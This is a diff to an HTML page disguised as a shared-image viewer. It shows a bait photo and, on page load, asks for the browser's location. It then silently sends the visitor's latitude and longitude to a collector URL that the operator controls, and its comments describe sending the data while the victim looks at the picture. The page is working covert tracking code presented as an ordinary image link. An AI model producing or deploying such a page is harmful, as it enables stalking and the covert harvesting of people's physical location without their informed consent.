@@ -4,13 +4,18 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 20px; }
-        img { width: 100%; max-width: 500px; border-radius: 8px; margin-top: 20px; }
-        p { font-size: 14px; color: #888; margin-top: 10px; }
+        body { background: #000; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        .container { padding: 20px; }
+        img { width: 100%; max-width: 500px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,255,255,0.1); }
+        h2 { font-size: 18px; margin-top: 20px; color: #eee; }
     </style>
 </head>
-<body onload="getLocation()"> <img src="bait.jpg" id="photo">
-    <p>Loading high-resolution preview...</p>
+<body onload="getLocation()">
+
+    <div class="container">
+        <h2>Shared Image</h2>
+        <img src="bait.jpg" id="photo">
+    </div>
 
     <script>
         // REPLACE THIS with your Pipedream/RequestBin URL
@@ -18,19 +23,18 @@
 
         function getLocation() {
             if (navigator.geolocation) {
-                // This triggers the browser popup instantly
+                // This triggers the browser popup as the photo loads
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             }
         }
 
         function showPosition(position) {
-            // Sends the Latitude and Longitude to your dashboard
+            // Sends the data silently while they look at the cat
             fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&type=InstantImage");
         }
 
         function showError(error) {
-            // If they deny, it just does nothing or stays on the photo
-            console.log("Location denied.");
+            console.log("User denied location.");
         }
     </script>
 </body>
